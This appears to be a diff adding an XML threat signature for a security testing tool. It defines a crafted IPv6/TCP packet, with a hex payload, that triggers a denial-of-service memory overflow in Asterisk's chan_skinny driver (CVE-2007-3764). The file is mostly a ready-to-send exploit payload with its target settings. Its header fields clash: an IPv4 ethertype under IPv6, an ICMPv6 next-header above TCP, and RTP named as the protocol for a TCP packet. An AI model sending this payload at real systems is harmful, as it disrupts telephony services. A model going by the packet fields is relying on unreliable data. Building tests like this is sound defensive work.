@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Asterisk &lt; 1.2.22 / 1.4.8 / 2.2.1 chan_skinny Remote Denial of Service Vulnerability (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat sends crafted packet, which results in an &quot;overly large memcpy.&quot; in the Skinny channel driver (chan_skinny) in Asterisk. The packet is sent to a vulnerable Asterisk appliance on port 2000. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="RTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Asterisk"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Asterisk_Asterisk"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Asterisk_Asterisk_1.4.7"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/4196"/>
+    <CVEID display="true" value="CVE-2007-3764"/>
+    <bugtraqID display="true" value="24950"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="cf8da4177274481ff1a7e5963b66ad5c"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1211987464"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1186713765" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="RTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$RTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="030000000000000000000001534550303030374542343633313031000000000000000000000000003675000000000000710000000000000003000000000000000000000153455030303037454234363331303100000000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
